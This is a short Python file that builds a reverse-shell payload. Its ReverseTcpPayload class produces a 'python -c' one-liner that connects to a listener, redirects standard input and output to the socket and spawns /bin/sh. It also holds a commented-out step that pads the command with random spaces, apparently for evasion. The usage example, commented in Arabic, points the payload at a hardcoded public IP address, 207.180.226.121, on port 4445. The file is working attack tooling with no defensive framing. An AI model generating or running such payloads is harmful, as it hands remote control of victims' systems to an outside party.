import socket
import subprocess
import os
import random
import sys

class ReverseTcpPayload:
    def __init__(self, lhost, lport, shell='/bin/sh', python_path='python'):
        self.lhost = lhost
        self.lport = lport
        self.shell = shell
        self.python_path = python_path

    def generate(self):
        return self.command_string()

    def random_padding(self):
        return " " * random.randint(1, 10)

    def command_string(self):
        raw_cmd = f"import socket,subprocess,os;host=\'{self.lhost}\';port={self.lport};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\'{self.shell}\')"

        # cmd = raw_cmd.replace(',', f"{self.random_padding()},{self.random_padding()}")\
        #             .replace(';', f"{self.random_padding()};{self.random_padding()}")
        
        return f"{self.python_path} -c \"{raw_cmd}\""

# مثال على الاستخدام
if __name__ == '__main__':
    payload = ReverseTcpPayload('207.180.226.121', 4445)
    payload_code = payload.generate()
    print(payload_code)
